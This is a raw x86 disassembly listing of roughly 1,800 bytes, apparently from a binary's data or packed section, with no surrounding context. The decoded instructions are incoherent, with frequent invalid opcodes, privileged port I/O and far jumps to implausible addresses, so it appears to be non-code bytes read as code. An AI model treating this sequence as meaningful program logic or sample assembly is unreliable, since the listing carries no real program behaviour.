  410255:	push   ebx
  410256:	stc    
  410257:	inc    ebx
  410258:	push   esi
  410259:	pusha  
  41025a:	(bad)  
  41025b:	push   edx
  41025c:	loope  0x410203
  41025e:	in     al,dx
  41025f:	inc    edi
  410260:	popa   
  410261:	das    
  410262:	rol    BYTE PTR [ecx],cl
  410264:	int    0x46
  410266:	ror    BYTE PTR [edx-0x6d],cl
  410269:	sub    BYTE PTR [ebx+0x681c160e],bl
  41026f:	adc    BYTE PTR [ebp+0x7f47b1e6],al
  410275:	mov    dh,0x7
  410277:	jns    0x41022e
  410279:	test   eax,0x54f176f7
  41027e:	sar    BYTE PTR [esp+ebp*8+0x5],cl
  410282:	jp     0x4102b2
  410284:	jb     0x410272
  410286:	les    ebx,FWORD PTR [edx-0x5d]
  410289:	jns    0x410227
  41028b:	std    
  41028c:	push   ebx
  41028d:	mov    edx,0xa71fd56a
  410292:	and    esi,edx
  410294:	bound  ebx,QWORD PTR [ecx-0x385f4758]
  41029a:	or     eax,0x64c76a28
  41029f:	add    BYTE PTR [edx+0x25dcef42],cl
  4102a5:	pop    ecx
  4102a6:	mov    al,0xc6
  4102a8:	dec    ebp
  4102a9:	sti    
  4102aa:	test   DWORD PTR [edx+0xd6cc14b],edi
  4102b0:	sub    ebp,DWORD PTR [ebp-0x39e34b5d]
  4102b6:	sbb    esp,ebp
  4102b8:	idiv   DWORD PTR [ebx+0x7a]
  4102bb:	in     eax,0xae
  4102bd:	jl     0x410327
  4102bf:	sbb    DWORD PTR [ebx+0x38],edi
  4102c2:	popf   
  4102c3:	es pop edx
  4102c5:	or     BYTE PTR [edi+ebx*4-0xf],bl
  4102c9:	jg     0x41027c
  4102cb:	test   eax,0xe341ee8d
  4102d0:	sub    al,0x38
  4102d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d3:	into   
  4102d4:	hlt    
  4102d5:	inc    esi
  4102d6:	stc    
  4102d7:	imul   esi,esi,0xfffffffc
  4102da:	loop   0x41034b
  4102dc:	add    dl,BYTE PTR [edi+0x1a68bd97]
  4102e2:	mov    WORD PTR [edi+0x69945b9c],ds
  4102e8:	stos   DWORD PTR es:[edi],eax
  4102e9:	lods   al,BYTE PTR ds:[esi]
  4102ea:	gs inc esp
  4102ec:	push   edx
  4102ed:	pushf  
  4102ee:	add    al,0xc9
  4102f0:	and    eax,0x1ae64c68
  4102f5:	jbe    0x4102b4
  4102f7:	int3   
  4102f8:	mov    dl,0xae
  4102fa:	outs   dx,DWORD PTR ds:[esi]
  4102fb:	mov    esp,0xe731c281
  410300:	in     eax,0x11
  410302:	sub    BYTE PTR [ebx-0x28],al
  410305:	(bad)  
  410306:	xchg   ecx,eax
  410307:	jb     0x41036e
  410309:	sub    ecx,ecx
  41030b:	and    BYTE PTR [ecx+0x7b2bf7a2],al
  410311:	lock out dx,eax
  410313:	js     0x41029c
  410315:	cmp    al,0xb
  410317:	mov    dh,0x4b
  410319:	or     al,0xa2
  41031b:	xchg   BYTE PTR [eax],dh
  41031d:	sbb    DWORD PTR [ecx+0x65],esp
  410320:	and    ebx,DWORD PTR [eax+esi*8+0x141c371b]
  410327:	outs   dx,DWORD PTR ds:[esi]
  410328:	inc    ebx
  410329:	stos   DWORD PTR es:[edi],eax
  41032a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41032c:	jnp    0x41037a
  41032e:	test   eax,0xff5f57c0
  410333:	aam    0x0
  410335:	ret    
  410336:	xchg   BYTE PTR [edi+0x67],ah
  410339:	push   0xec12990b
  41033e:	sub    DWORD PTR ds:0xcee98a45,ebx
  410344:	fs xor eax,0xa84fd09a
  41034a:	push   0xffffffdf
  41034c:	or     al,0x39
  41034e:	sub    ah,BYTE PTR [eax+0x5a]
  410351:	das    
  410352:	or     eax,DWORD PTR [ecx-0x10a8f823]
  410358:	mov    al,ds:0xacc345cf
  41035d:	mov    ecx,0xfea137f7
  410362:	aas    
  410363:	mov    ebx,0xf4ba5ce3
  410368:	adc    DWORD PTR [ebp-0x21],ebx
  41036b:	dec    ebx
  41036c:	pop    ds
  41036d:	mov    ds:0xdf2ead03,eax
  410372:	and    eax,0x90a2549e
  410377:	fs inc ebx
  410379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41037a:	mov    esp,0x6133bb0f
  41037f:	ret    0x683f
  410382:	pop    ebp
  410383:	call   0x3a0b0d03
  410388:	jle    0x410311
  41038a:	push   edi
  41038b:	xor    eax,0xcf2e53a2
  410390:	in     al,0xe0
  410392:	aam    0x41
  410394:	std    
  410395:	push   ebx
  410396:	mov    ds:0xe6894bfb,al
  41039b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41039c:	jg     0x410369
  41039e:	jno    0x41038a
  4103a0:	out    0xfb,eax
  4103a2:	fwait
  4103a3:	sub    al,BYTE PTR [eax-0x4fd24599]
  4103a9:	jae    0x4103a1
  4103ab:	test   eax,0xd4f73009
  4103b0:	repz (bad) 
  4103b2:	push   0xcc6c5f8c
  4103b7:	(bad)
  4103bb:	ja     0x4103d4
  4103bd:	das    
  4103be:	sub    edx,DWORD PTR [edx-0x7b]
  4103c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103c2:	fs inc ebp
  4103c4:	not    eax
  4103c6:	popa   
  4103c7:	jecxz  0x4103f8
  4103c9:	and    al,BYTE PTR cs:[edx]
  4103cc:	pop    ebp
  4103cd:	dec    ebp
  4103ce:	jmp    0x41041f
  4103d0:	adc    DWORD PTR ds:0x3c5069c6,esi
  4103d6:	(bad)
  4103da:	ficomp WORD PTR [esi+0x45a9da8c]
  4103e0:	sub    al,0x43
  4103e2:	test   eax,0x409b6fb7
  4103e7:	sbb    eax,0x71bae8b6
  4103ec:	and    edi,eax
  4103ee:	sub    dl,BYTE PTR [edx*1-0x1701872e]
  4103f5:	das    
  4103f6:	ror    BYTE PTR [edi-0x13900fd6],1
  4103fc:	jg     0x41043c
  4103fe:	inc    ebx
  4103ff:	fcom   QWORD PTR [ebp-0xf22189e]
  410405:	mov    al,ds:0xc6c16655
  41040a:	dec    edi
  41040b:	loop   0x410423
  41040d:	jae    0x410450
  41040f:	(bad)  
  410410:	hlt    
  410411:	jb     0x41041c
  410413:	rcl    DWORD PTR [ecx+0x60de7205],0x2
  41041a:	cmp    ebx,0x6d6f662e
  410420:	add    esi,ebx
  410422:	pop    ds
  410423:	jo     0x4103b2
  410425:	jae    0x410431
  410427:	jmp    0xb87f:0xe6b0bb5e
  41042e:	imul   ebp,DWORD PTR [eax+0x5b],0x331bec15
  410435:	inc    ebp
  410436:	jno    0x4103ef
  410438:	push   ecx
  410439:	jmp    0x4103e4
  41043b:	mov    ebp,0x15b141c7
  410440:	lock into 
  410442:	jecxz  0x4103e9
  410444:	loope  0x4103fe
  410446:	shl    ah,cl
  410448:	push   0x65b18466
  41044d:	push   ecx
  41044e:	push   ecx
  41044f:	test   eax,0x48c543c8
  410454:	adc    eax,0xd7818377
  410459:	test   DWORD PTR [esi+eax*1-0x44],edi
  41045d:	jae    0x41043e
  41045f:	popf   
  410460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410461:	loopne 0x4104a5
  410463:	stos   DWORD PTR es:[edi],eax
  410464:	fstp   QWORD PTR [eax-0x59]
  410467:	cs dec eax
  410469:	mov    edi,0xf447a90d
  41046e:	iret   
  41046f:	sub    bl,ch
  410471:	dec    esp
  410472:	out    0x8e,eax
  410474:	dec    edi
  410475:	add    DWORD PTR [edi-0x2e],eax
  410478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410479:	or     eax,0xf7c1ea95
  41047e:	push   ss
  41047f:	loop   0x410439
  410481:	cdq    
  410482:	in     al,0x8b
  410484:	pop    ebp
  410485:	mov    ecx,0xd164fd9
  41048a:	add    eax,0xbdda233
  41048f:	mov    esp,0xc020d22f
  410494:	(bad)  
  410495:	mov    BYTE PTR [ecx-0x69df21e],al
  41049b:	and    eax,eax
  41049d:	or     BYTE PTR [ecx],ah
  41049f:	push   0xffffffe3
  4104a1:	sub    al,0x24
  4104a3:	adc    DWORD PTR [ecx+0x30b1a02d],ecx
  4104a9:	inc    edi
  4104aa:	dec    eax
  4104ab:	pusha  
  4104ac:	push   edi
  4104ad:	cli    
  4104ae:	dec    ecx
  4104af:	jge    0x41051e
  4104b1:	and    edx,0x2d
  4104b4:	imul   ecx,DWORD PTR [esi+0x9],0xfffffff6
  4104b8:	ds add ebx,0xffffffe6
  4104bc:	xor    al,0x30
  4104be:	out    0x36,al
  4104c0:	sbb    dl,BYTE PTR [ecx+0x35345a44]
  4104c6:	(bad)  
  4104c8:	push   eax
  4104c9:	adc    eax,0xadf2040d
  4104ce:	adc    al,0xe0
  4104d0:	sub    esi,esi
  4104d2:	aas    
  4104d3:	inc    ecx
  4104d4:	aas    
  4104d5:	xor    bl,BYTE PTR [ebx]
  4104d7:	cmc    
  4104d8:	retf   
  4104d9:	or     DWORD PTR [ebx+0x4a],eax
  4104dc:	jecxz  0x41045e
  4104de:	and    al,0xf1
  4104e0:	(bad)  
  4104e2:	sbb    ebx,ebp
  4104e4:	bound  ecx,QWORD PTR [ebx-0x7a]
  4104e7:	repnz pop edx
  4104e9:	fistp  WORD PTR [ecx+0x51]
  4104ec:	mov    WORD PTR [ecx+0x48871141],ss
  4104f2:	adc    esp,ecx
  4104f4:	push   esp
  4104f5:	jno    0x4104f4
  4104f7:	inc    ebp
  4104f8:	sub    cl,cl
  4104fa:	cmp    ecx,eax
  4104fc:	test   DWORD PTR ds:0x13c84fc7,esi
  410502:	mov    eax,0x54f8eacc
  410507:	(bad)  
  410508:	pop    edx
  410509:	pop    ebp
  41050a:	cmp    eax,0xba7e510
  41050f:	xchg   ebx,eax
  410510:	pop    edx
  410511:	addr16 test dh,0x45
  410515:	lock shl BYTE PTR [edi+ebx*1+0x1e1f9cc4],0xaa
  41051e:	xchg   esi,eax
  41051f:	leave  
  410520:	shr    DWORD PTR [esi+0x1e095082],1
  410526:	aas    
  410527:	or     al,0xdf
  410529:	mov    cl,0xea
  41052b:	inc    ebp
  41052c:	das    
  41052d:	pop    esp
  41052e:	adc    DWORD PTR [esi-0x20],ebp
  410531:	int3   
  410532:	es call 0xa65190b6
  410538:	mov    al,dh
  41053a:	inc    ebx
  41053c:	jbe    0x41056a
  41053e:	mov    ebx,edx
  410540:	push   eax
  410541:	and    dh,BYTE PTR [ebx+0x25f0af2a]
  410547:	xchg   ebx,eax
  410548:	inc    esp
  410549:	add    dh,BYTE PTR [eax]
  41054b:	outs   dx,BYTE PTR ds:[esi]
  41054c:	sbb    BYTE PTR [edi],cl
  41054e:	pop    ss
  41054f:	test   al,0x6f
  410551:	retf   0xd88f
  410554:	and    dl,cl
  410556:	or     esp,edx
  410558:	or     esi,esi
  41055a:	mov    esi,edi
  41055c:	int    0xe7
  41055e:	cmp    eax,0xdbe8a8b7
  410563:	popf   
  410564:	ret    0x23d4
  410567:	inc    ebx
  410568:	jmp    0x6155:0xca8e40ce
  41056f:	daa    
  410570:	adc    DWORD PTR [ecx-0x76],ecx
  410573:	xchg   DWORD PTR [esi-0x33990d30],eax
  410579:	push   0x5b
  41057b:	retf   0x46ab
  41057e:	or     ah,bh
  410580:	xchg   edi,eax
  410581:	das    
  410582:	mov    ds:0xd2a38bb,al
  410587:	int    0x32
  410589:	rep ins DWORD PTR es:[edi],dx
  41058b:	or     DWORD PTR [esi-0xd1d8957],0x4
  410592:	loopne 0x410558
  410594:	test   BYTE PTR [ecx-0x73],bh
  410597:	inc    ebx
  410598:	sub    bl,BYTE PTR [esi-0x7d729f97]
  41059e:	clc    
  41059f:	or     ah,dl
  4105a1:	pop    ds
  4105a2:	mov    ah,0xa1
  4105a4:	mov    ebp,0x67c6d680
  4105a9:	sbb    dh,cl
  4105ab:	outs   dx,DWORD PTR ds:[esi]
  4105ac:	test   DWORD PTR ds:0x3ea2fc82,ebp
  4105b2:	std    
  4105b3:	adc    dh,0xa
  4105b6:	test   eax,0x67960456
  4105bb:	mov    eax,ds:0xb21aa351
  4105c0:	mov    bl,0x2a
  4105c2:	push   gs
  4105c4:	lahf   
  4105c5:	ss test eax,0x7f2af41a
  4105cb:	xor    eax,0x7336b3f6
  4105d0:	jg     0x4105ce
  4105d2:	ins    DWORD PTR es:[edi],dx
  4105d3:	add    al,0xd6
  4105d5:	mov    ebp,DWORD PTR [ebp-0x6af1a542]
  4105db:	call   0x130c4d8a
  4105e0:	sub    ah,al
  4105e2:	mov    ebp,0x8e0f615e
  4105e7:	and    DWORD PTR [ebx-0x63],ebx
  4105ea:	cmp    al,0x5b
  4105ec:	xlat   BYTE PTR ds:[ebx]
  4105ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105ee:	sti    
  4105ef:	(bad)  
  4105f1:	(bad)  
  4105f2:	fucomi st,st(1)
  4105f4:	cmp    eax,0xedddac8e
  4105f9:	xchg   edi,eax
  4105fa:	or     al,0x9e
  4105fc:	and    DWORD PTR [ebx-0x2a3562df],ecx
  410602:	inc    esi
  410603:	ja     0x410592
  410605:	inc    edi
  410606:	dec    ebp
  410607:	and    al,0x6c
  410609:	or     al,0xa9
  41060b:	or     ebx,edx
  41060d:	mov    ecx,0x8c582e66
  410612:	or     BYTE PTR [edi],al
  410614:	gs xchg edi,eax
  410616:	push   ebx
  410617:	inc    edi
  410618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410619:	lahf   
  41061a:	xor    dh,BYTE PTR gs:[edx]
  41061d:	lds    ecx,FWORD PTR [edi*8-0x948a38d]
  410624:	pop    ecx
  410625:	push   eax
  410626:	pop    es
  410627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410628:	mov    al,0x16
  41062a:	inc    edi
  41062b:	jae    0x410608
  41062d:	cld    
  41062e:	sbb    BYTE PTR fs:[edx+0x70],cl
  410632:	jno    0x410640
  410634:	arpl   WORD PTR [edx-0x606a0bd1],dx
  41063a:	imul   esi,ebx,0x50573edb
  410640:	push   cs
  410641:	(bad)  
  410642:	pavgw  mm5,QWORD PTR [ebx+0x68]
  410646:	mov    bl,0x82
  410648:	inc    esp
  410649:	cmp    ah,BYTE PTR [edi+edx*1]
  41064c:	popa   
  41064d:	icebp  
  41064e:	sbb    edi,DWORD PTR [ecx-0x16fdc2dc]
  410654:	(bad)  
  410655:	in     eax,0xdf
  410657:	sti    
  410658:	pop    edx
  410659:	jns    0x4105e7
  41065b:	cmc    
  41065c:	sbb    al,0x7e
  41065e:	pop    ebx
  41065f:	imul   edi,DWORD PTR [ecx],0x6f4ab0fb
  410665:	lods   al,BYTE PTR ds:[esi]
  410666:	dec    esi
  410667:	jg     0x410686
  410669:	mov    edi,0x9ffd0c2a
  41066e:	adc    ebp,DWORD PTR [eax]
  410670:	cs loopne 0x41065d
  410673:	out    dx,al
  410674:	retf   
  410675:	repz mov dl,0xe4
  410678:	push   es
  410679:	mov    ah,0x51
  41067b:	push   0x58
  41067d:	pop    edx
  41067e:	or     ebp,DWORD PTR [ebx+0xf]
  410681:	call   0xa33e:0x9466aa81
  410688:	add    eax,0x89b8ae00
  41068d:	mov    cl,0x2f
  41068f:	xlat   BYTE PTR ds:[ebx]
  410690:	imul   ebp,DWORD PTR ds:0xc1c04690,0xffffffe9
  410697:	std    
  410698:	sub    eax,0x844e55f6
  41069d:	outs   dx,BYTE PTR ds:[esi]
  41069e:	pop    edx
  41069f:	pushf  
  4106a0:	fist   DWORD PTR [edx]
  4106a2:	dec    ecx
  4106a3:	jne    0x4106b2
  4106a5:	mov    edi,0x1cac7456
  4106aa:	fistp  DWORD PTR [ecx]
  4106ac:	sbb    al,0xa
  4106ae:	mov    dh,0x27
  4106b0:	ins    DWORD PTR es:[edi],dx
  4106b1:	xor    bl,dh
  4106b3:	pop    ss
  4106b4:	jbe    0x41070f
  4106b6:	scas   al,BYTE PTR es:[edi]
  4106b7:	std    
  4106b8:	loopne 0x41071e
  4106ba:	inc    ebx
  4106bb:	push   eax
  4106bc:	test   eax,0x5c1ab8c9
  4106c1:	mov    ebp,0xa11965db
  4106c6:	inc    esp
  4106c7:	xchg   ebx,eax
  4106c8:	sbb    dh,BYTE PTR [ecx-0x2b]
  4106cb:	xchg   ebp,eax
  4106cc:	(bad)  
  4106cd:	jns    0x4106c1
  4106cf:	aad    0x22
  4106d1:	gs enter 0xc3d4,0xb4
  4106d6:	dec    esp
  4106d7:	jb     0x41069f
  4106d9:	cs mov ecx,0x39aa3eab
  4106df:	push   0x17
  4106e1:	pop    esp
  4106e2:	or     BYTE PTR [edx-0x653ce8bf],dl
  4106e8:	in     eax,dx
  4106e9:	dec    ebx
  4106ea:	das    
  4106eb:	adc    cl,dl
  4106ed:	inc    esi
  4106ee:	shr    bh,1
  4106f0:	pop    ebx
  4106f1:	idiv   BYTE PTR [edi]
  4106f3:	gs cwde 
  4106f5:	data16 (bad) 
  4106f7:	xlat   BYTE PTR ds:[ebx]
  4106f8:	rcr    DWORD PTR [ecx+0x5e782a5b],0x56
  4106ff:	stos   BYTE PTR es:[edi],al
  410700:	jns    0x4106b6
  410702:	pop    edx
  410703:	inc    eax
  410704:	ret    
  410705:	jb     0x4106f2
  410707:	lds    eax,FWORD PTR [esi-0xe]
  41070a:	or     DWORD PTR [eax+edi*2-0x4d],edi
  41070e:	push   edi
  41070f:	mov    bl,0x4b
  410711:	aaa    
  410712:	cmp    BYTE PTR [edi+0x5f71c141],0xba
  410719:	xchg   ebp,eax
  41071a:	js     0x4106cc
  41071c:	push   esp
  41071d:	retf   
  41071e:	or     al,0x68
  410720:	xchg   edx,eax
  410721:	jl     0x410707
  410723:	out    dx,eax
  410724:	or     DWORD PTR [ebx-0x523007e2],esp
  41072a:	leave  
  41072b:	out    0xf6,al
  41072d:	mov    al,ds:0xbff6dca2
  410732:	xchg   edx,eax
  410733:	enter  0x20ef,0x14
  410737:	jne    0x410718
  410739:	ret    0x3321
  41073c:	adc    BYTE PTR [edx],bh
  41073e:	cdq    
  41073f:	popa   
  410740:	icebp  
  410741:	push   esi
  410742:	iret   
  410743:	icebp  
  410744:	push   edx
  410745:	push   es
  410746:	cmp    cl,BYTE PTR [ecx+0x497d185]
  41074c:	and    al,0x8d
  41074e:	jbe    0x410712
  410750:	push   cs
  410751:	arpl   WORD PTR [esi-0x79],bx
  410754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410755:	jl     0x410715
  410757:	mov    ah,0x6b
  410759:	add    eax,0x4ea144d6
  41075e:	adc    ecx,DWORD PTR [edi+ebp*2-0x9b4873b]
  410765:	xchg   ebx,eax
  410766:	out    0x62,eax
  410768:	mov    dh,0xa9
  41076a:	jmp    0x4107b5
  41076c:	dec    ebx
  41076d:	pop    edi
  41076e:	cmp    BYTE PTR [ebp-0x47001e4b],ah
  410774:	dec    ecx
  410775:	mov    eax,0x8388c060
  41077a:	push   edx
  41077b:	sbb    edx,DWORD PTR [ecx+ebp*2+0x43]
  41077f:	scas   eax,DWORD PTR es:[edi]
  410780:	gs xchg edi,eax
  410782:	jl     0x410713
  410784:	sub    DWORD PTR [ebx-0x24],ebp
  410787:	and    BYTE PTR [esi+0x785a1d08],0x3f
  41078e:	arpl   WORD PTR [esi-0x55],bx
  410791:	push   eax
  410792:	lods   al,BYTE PTR ds:[esi]
  410793:	arpl   WORD PTR [esi],cx
  410795:	mov    ebx,0xd87939b3
  41079a:	nop
  41079b:	dec    edi
  41079c:	add    DWORD PTR [ebx+eax*4+0x72],0x963f7ad1
  4107a4:	sbb    DWORD PTR ss:[ebx+0x7d],esi
  4107a8:	sub    esi,DWORD PTR [eax+0xfc52b28]
  4107ae:	in     al,dx
  4107af:	mov    ah,0xe0
  4107b1:	pop    esp
  4107b2:	jb     0x41082a
  4107b4:	pop    esi
  4107b5:	pop    eax
  4107b6:	int    0xec
  4107b8:	test   ah,cl
  4107ba:	and    bh,cl
  4107bc:	je     0x41081e
  4107be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107bf:	pop    es
  4107c0:	enter  0x6300,0xd7
  4107c4:	xchg   edi,eax
  4107c5:	cmp    al,0x8c
  4107c7:	imul   edi,DWORD PTR [edi+0x2d0473e1],0x3462ff2a
  4107d1:	or     BYTE PTR [eax+0x42e10749],0x86
  4107d8:	cdq    
  4107d9:	dec    esp
  4107da:	repz mov bh,0x76
  4107dd:	push   ebx
  4107de:	pop    esi
  4107df:	mov    esp,0xb431787a
  4107e4:	inc    ecx
  4107e5:	xchg   edi,eax
  4107e6:	ja     0x4107bb
  4107e8:	jge    0x4107fb
  4107ea:	dec    ebx
  4107eb:	sbb    BYTE PTR [edx+0x4a],dl
  4107ee:	repz std 
  4107f0:	aad    0x82
  4107f2:	or     al,0x1e
  4107f4:	ins    DWORD PTR es:[edi],dx
  4107f5:	mov    esp,0x7c9d9550
  4107fa:	arpl   WORD PTR [esi],cx
  4107fc:	inc    eax
  4107fd:	dec    edi
  4107fe:	mov    ah,0xa1
  410800:	push   edi
  410801:	leave  
  410802:	cmp    BYTE PTR [ecx+eax*4+0x70258407],ch
  410809:	pusha  
  41080a:	rcl    DWORD PTR [edi],1
  41080c:	dec    esp
  41080d:	cmp    BYTE PTR [ecx-0x664ee355],cl
  410813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410814:	inc    edi
  410815:	fisubr WORD PTR [ebx]
  410817:	ret    0xed3c
  41081a:	pop    esi
  41081b:	xchg   ecx,eax
  41081c:	lahf   
  41081d:	out    dx,eax
  41081e:	enter  0x2543,0x95
  410822:	ret    
  410823:	into   
  410824:	sbb    DWORD PTR ds:0x5fa0b35c,0xe6dcfb7
  41082e:	push   ebx
  41082f:	cdq    
  410830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410831:	pop    ebx
  410832:	pop    edi
  410833:	fstp   DWORD PTR [ebx+edx*2-0x70]
  410837:	out    dx,eax
  410838:	and    al,0x1d
  41083a:	push   ss
  41083b:	lock inc esi
  41083d:	scas   eax,DWORD PTR es:[edi]
  41083e:	gs retf 0xc837
  410842:	cmp    BYTE PTR [edx-0x3eef7860],dh
  410848:	aaa    
  410849:	sub    eax,ebx
  41084b:	inc    esi
  41084c:	in     al,dx
  41084d:	mov    al,ds:0x1d2a3780
  410852:	dec    edi
  410853:	pusha  
  410854:	cmp    eax,0x606d7f49
  410859:	(bad)  
  41085a:	dec    esi
  41085b:	rol    BYTE PTR [edi+0x49],1
  41085e:	or     ch,ah
  410860:	inc    esi
  410861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410862:	rcr    BYTE PTR [esi+0x425bbb27],1
  410868:	ror    ch,1
  41086a:	mov    eax,0x6a96fcfa
  41086f:	call   0x4a31:0xeedba96a
  410876:	in     eax,0x8f
  410878:	cmp    ecx,DWORD PTR [ebx]
  41087a:	fimul  DWORD PTR [eax+0x34c7e549]
  410880:	inc    edi
  410881:	lds    ebx,FWORD PTR [edi+0x36]
  410884:	sub    BYTE PTR [ecx],bh
  410886:	retf   0x2cea
  410889:	sbb    eax,0xaf28ec29
  41088e:	mov    ah,0xc9
  410890:	mov    dl,0xf9
  410892:	mov    ds:0x6abb5524,al
  410897:	je     0x410911
  410899:	sub    eax,0xd2188746
  41089e:	mov    al,ds:0x3dc99cba
  4108a3:	call   0xbde6:0x99a2355b
  4108aa:	imul   edx,DWORD PTR [eax-0x4daedb80],0xe28e9e9c
  4108b4:	pop    es
  4108b5:	in     al,dx
  4108b6:	out    dx,eax
  4108b7:	pop    ecx
  4108b8:	(bad)  
  4108b9:	(bad)  
  4108ba:	out    dx,eax
  4108bb:	add    eax,DWORD PTR ds:0xee93b80a
  4108c1:	add    ah,dh
  4108c3:	pop    edi
  4108c4:	mov    cl,0x9e
  4108c6:	aam    0xd1
  4108c8:	adc    DWORD PTR [ecx+eax*8],ebp
  4108cb:	lock push edx
  4108cd:	adc    ebx,esp
  4108cf:	and    BYTE PTR [ebp-0x40],cl
  4108d2:	mov    al,ds:0xc434c893
  4108d7:	mov    ds:0x39790735,eax
  4108dc:	mov    ds:0xea7ad85b,al
  4108e1:	imul   esi,DWORD PTR [ecx+edx*4-0x7b],0x1b
  4108e6:	(bad)  
  4108e7:	sub    al,0x12
  4108e9:	int3   
  4108ea:	aad    0x71
  4108ec:	es into 
  4108ee:	(bad)  [edx-0x75]
  4108f1:	rcr    edi,0xb0
  4108f4:	enter  0x6ec3,0xc2
  4108f8:	cmp    dl,dh
  4108fa:	mov    ah,0x37
  4108fc:	adc    BYTE PTR [edx-0x40c406d6],cl
  410902:	fcomp  DWORD PTR [edi+0x75]
  410905:	add    ch,BYTE PTR [edi]
  410907:	lock out 0x4c,al
  41090a:	sbb    dl,ch
  41090c:	xchg   ebp,eax
  41090d:	fadd   st(1),st
  41090f:	jbe    0x41092b
  410911:	push   esi
  410912:	push   ecx
  410913:	popf   
  410914:	retf   
  410915:	dec    ebx
  410916:	fwait
  410917:	cli    
  410918:	rcl    BYTE PTR [ecx+ebx*1+0x6d],1
  41091c:	in     al,dx
  41091d:	fwait
  41091e:	imul   eax,DWORD PTR [ebp-0x3c2956d4],0x45ac2e87
  410928:	pop    ebx
  410929:	scas   al,BYTE PTR es:[edi]
  41092a:	and    dl,BYTE PTR [edx+esi*1-0x4f6259be]
  410931:	sub    al,0x6d
  410933:	xor    al,0x34
  410935:	push   ss
  410936:	cmp    BYTE PTR [esi+0x65],0xba
  41093a:	jecxz  0x410997
  41093c:	jns    0x410945
  41093e:	xchg   ebp,eax
  41093f:	jb     0x4108cc
  410941:	sbb    eax,0x5fd5e71d
  410946:	cmp    BYTE PTR [ecx+0x7e],ch
  410949:	pop    edi
  41094a:	stc    
  41094b:	int    0x7
  41094d:	inc    eax
  41094e:	pop    edi
  41094f:	mov    esp,ds
  410951:	dec    eax
  410952:	inc    ecx
  410953:	cli    
  410954:	cli    
  410955:	add    ecx,DWORD PTR [esi]
  410957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410958:	jmp    0xd191:0x4a62abf2
  41095f:	scas   al,BYTE PTR es:[edi]
  410960:	call   0x89d581ef
  410965:	int3   
  410966:	mov    ebp,DWORD PTR [ebp+ecx*4+0x3bc1ddda]
  41096d:	add    al,0xe1
  41096f:	push   cs
  410970:	mov    ebp,0x5b7dbbfb
  410975:	dec    ecx
  410976:	mov    eax,ds:0x4c820ce3
  41097b:	test   al,0xe6
  41097d:	pop    eax
  41097e:	xor    BYTE PTR [eax+esi*2-0x7f],al
  410982:	inc    eax
  410983:	out    0x68,eax
  410985:	mov    cl,0x59
  410987:	fiadd  WORD PTR ds:0xe977fb94
  41098d:	add    ah,ch
  41098f:	mov    bh,0x70
  410991:	mov    dh,0x8c
  410993:	lods   al,BYTE PTR ds:[esi]
  410994:	mov    ?,WORD PTR [eax+0x34]
  410997:	dec    eax
  410998:	mov    cl,BYTE PTR [eax+edx*1+0x7f74727]
  41099f:	dec    ebx
  4109a0:	ficomp DWORD PTR [esi]
  4109a2:	gs icebp 
  4109a4:	jae    0x410960
  4109a6:	sub    BYTE PTR [ecx+0x1e],0x2a
  4109aa:	fwait
  4109ab:	imul   ebp,DWORD PTR [ebx-0x2a],0xffffffbc
  4109af:	fs ins DWORD PTR es:[edi],dx
  4109b1:	add    eax,0x35a857cf
  4109b6:	dec    edi
  4109b7:	test   DWORD PTR [edi+0x754f6cce],esi
  4109bd:	mov    ah,bl
  4109bf:	cmp    al,0xb6
  4109c1:	mov    edx,0x41abddd9
  4109c6:	adc    edi,DWORD PTR [ecx]
  4109c8:	fldenv [edx-0x6b]
  4109cb:	js     0x410970
  4109cd:	mov    gs,WORD PTR [esp+eax*4+0x455881db]
  4109d4:	ins    DWORD PTR es:[edi],dx
  4109d5:	js     0x410a36
  4109d7:	inc    esi
  4109d8:	xor    BYTE PTR [ebx],cl
  4109da:	xor    cl,dh
  4109dc:	or     BYTE PTR ds:0x1087e3f8,ch
  4109e2:	ret    
  4109e3:	cmp    eax,0x9c71894e
  4109e8:	pop    ecx
  4109e9:	std    
  4109ea:	add    ah,al
  4109ec:	push   0x34
  4109ee:	push   ss
  4109ef:	stc    
  4109f0:	inc    esp
  4109f1:	push   es
  4109f2:	dec    DWORD PTR [ebx]
  4109f4:	sub    cl,BYTE PTR [ecx+edx*4+0x326eb1a5]
  4109fb:	cwde   
  4109fc:	and    edi,DWORD PTR [bp+di-0x71b3]
  410a01:	sbb    eax,0xe50482be
  410a06:	add    al,0xb
  410a08:	ins    DWORD PTR es:[edi],dx
  410a09:	mov    bl,0xf7
  410a0b:	push   esp
  410a0c:	pop    eax
  410a0d:	jb     0x410a63
  410a0f:	inc    esp
  410a10:	jle    0x4109e4
  410a12:	mov    eax,ds:0x929f696d
  410a17:	jae    0x4109cc
  410a19:	inc    eax
  410a1a:	out    dx,eax
  410a1b:	or     ecx,DWORD PTR [edx-0x4e]
  410a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a1f:	fisubr WORD PTR [ecx+0x57ef05b]
  410a25:	int    0xe7
  410a27:	in     eax,dx
  410a28:	xor    eax,0x56f8e6b
  410a2d:	stos   DWORD PTR es:[edi],eax
  410a2e:	(bad)  
  410a30:	cs popf 
  410a32:	aad    0x4a
  410a34:	mov    edx,0x1cf328b1
  410a39:	fcom   DWORD PTR [ebx+0x4eda5b9f]
  410a3f:	push   0x11fd28a
  410a44:	popa   
  410a45:	sbb    ah,BYTE PTR [ebx-0xf]
  410a48:	pop    ebx
  410a49:	(bad)  
  410a4a:	pop    eax
  410a4b:	dec    ecx
  410a4c:	push   ecx
  410a4d:	lea    esi,[ebx]
  410a4f:	call   0x13b308a4
  410a54:	mov    edx,0x3df76702
